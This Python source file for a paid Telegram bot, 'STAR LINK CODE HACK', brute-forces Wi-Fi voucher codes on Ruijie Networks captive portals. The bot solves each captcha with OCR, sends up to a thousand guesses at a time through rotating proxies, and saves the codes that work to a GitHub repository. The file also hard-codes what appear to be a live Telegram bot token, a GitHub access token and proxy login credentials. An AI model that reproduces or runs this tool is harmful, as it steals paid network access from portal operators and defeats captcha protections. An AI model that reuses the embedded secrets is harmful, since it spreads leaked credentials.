import os
import aiohttp
import asyncio
import json
import base64
import random
import re
import string
import time
import uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = os.getenv("BOT_TOKEN", "8742216295:AAHLKP262FLXFeHTIeqdlceMBRbXJBwsvTc")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "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")
REPO_OWNER = os.getenv("REPO_OWNER", "makkqt")
REPO_NAME = os.getenv("REPO_NAME", "yes")
ADMIN_ID = os.getenv("ADMIN_ID", "8728200516")

PROXY_LIST = [
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060"
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 1000
_voucher_sem = None
_start_time = time.monotonic()

MAX_CONCURRENT_SCANS = 20
active_scans_count = 0
active_scans_lock = asyncio.Lock()
paid_users = {}

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန် နှိပ်ပါ", callback_data="menu_enter_userid"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if user_id in paid_users or user_id in approve:
        approve[message.chat.id] = True
        welcome_text = f"✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\n✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။"
    else:
        welcome_text = f"✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\n⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။ PAID USER ဖြစ်ရန် နှိပ်ပါ။"
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    if call.data == "menu_back":
        text = f"✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        text = f"🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_start_scam":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ Paid User မဟုတ်ပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data.get(chat_id, {}).get('selected_mode')
        start_digit = user_data.get(chat_id, {}).get('start_digit')
        session_url = user_data.get(chat_id, {}).get('session_url')
        
        if not session_url:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...")
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(run_bruteforce(mode, chat_id, session_url, scan_id, message=call.message, progress_msg=progress_msg, start_digit=start_digit))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_paid":
        text = f"🔑 PAID USER ဖြစ်ရန်\n\nUSER ID: {user_id}\n\n✅ Admin ထံ Key ဝယ်ယူပြီးပါက အောက်ပါခလုတ်ကို နှိပ်ပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_paid_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_enter_userid":
        auth_list, _ = await get_file_content("auth_list.json")
        if user_id in auth_list and check_key_expiration(auth_list[user_id]):
            approve[chat_id] = True
            paid_users[user_id] = True
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}", reply_markup=get_main_keyboard())
        else:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"❌ Key မရှိသေးပါ သို့မဟုတ် Expired ဖြစ်နေပါသည်။\n\nUSER ID: {user_id}", reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_result":
        results, _ = await get_file_content("result.json")
        codes = "\n".join(results.get(user_id, []))
        text = f"✅ Found Codes:\n{codes}" if codes else "📋 သင့်တွင် Success Code မရှိသေးပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_stop":
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["stop"] = True
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 VOUCHER အမျိုးအစား: {mode}\n\n✅ START SCAM ကိုနှိပ်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode, digit = parts[1], parts[2]
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 VOUCHER Mode: {mode}\n🔢 ထိပ်စီးနံပါတ်: {digit}\n\n✅ START SCAM ကိုနှိပ်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve, paid_users
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "🔑 /key [your_key_here]")
        return
    key = args[1]
    user_id = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key == user_id or user_id in auth_list or key in auth_list:
        if check_key_expiration(auth_list.get(user_id, auth_list.get(key, {}))):
            approve[message.chat.id] = True
            paid_users[user_id] = True
            await bot.reply_to(message, f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}")
            return
    await bot.reply_to(message, f"❌ Key မမှန်ကန်ပါ။ USER ID: {user_id}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey unlimited [user_id]")
        return
    plan, user_id = args[1], args[2]
    expiry = "9999-12-31T23:59:59Z" if plan == "unlimited" else (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
    await bot.reply_to(message, f"✅ Key Generated\nUSER ID: {user_id}\nPLAN: {plan}")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "❌ Paid User မဟုတ်ပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "🔗 /portal [your_portal_url]")
        return
    url = args[1]
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    user_data[message.chat.id]['session_url'] = url
    await bot.reply_to(message, "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။ VOUCHER ရွေးရန် Menu ကိုသုံးပါ။", reply_markup=get_voucher_keyboard())

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        return False
    except:
        return False

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        while True:
            yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    if mode == "mixed":
        while True:
            yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    if mode == "mixed8":
        while True:
            yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    raise ValueError(f"Unsupported mode: {mode}")

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    total = 10 ** int(mode) if mode in ["6", "7", "8"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return
            batch = [next(code_iter, None) for _ in range(1000)]
            batch = [c for c in batch if c]
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=f"🔍Scanning...\n📦Checked : {checked:,}\n⚡Speed : {speed:,.0f} codes/min")
            except:
                pass
    finally:
        scan_tasks.pop(chat_id, None)

async def perform_check(session_url, code, chat_id, message=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as task_session:
            async with task_session.get(session_url, allow_redirects=True) as req:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                if not sid_match: return
                sid = sid_match.group(1)
            
            async with task_session.get(f"https://portal-as.ruijienetworks.com/api/auth/captcha?sessionId={sid}") as resp:
                img = await resp.read()
            
            ocr = ddddocr.DdddOcr(show_ad=False)
            txt = ocr.classification(img)
            
            async with task_session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': txt}) as r:
                if not (await r.json()).get("success"): return

            async with task_session.post(post_url, json={"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": txt}) as r:
                resp_text = await r.text()
                if 'logonUrl' in resp_text:
                    results, sha = await get_file_content("result.json")
                    chat_str = str(chat_id)
                    if chat_str not in results: results[chat_str] = []
                    if code not in results[chat_str]:
                        results[chat_str].append(code)
                        await update_file_content("result.json", results, sha, f"Found code {code}")
                    if message:
                        await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
    except:
        pass

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=20000, limit_per_host=10000, ssl=False)
    session = aiohttp.ClientSession(connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        await bot.infinity_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())

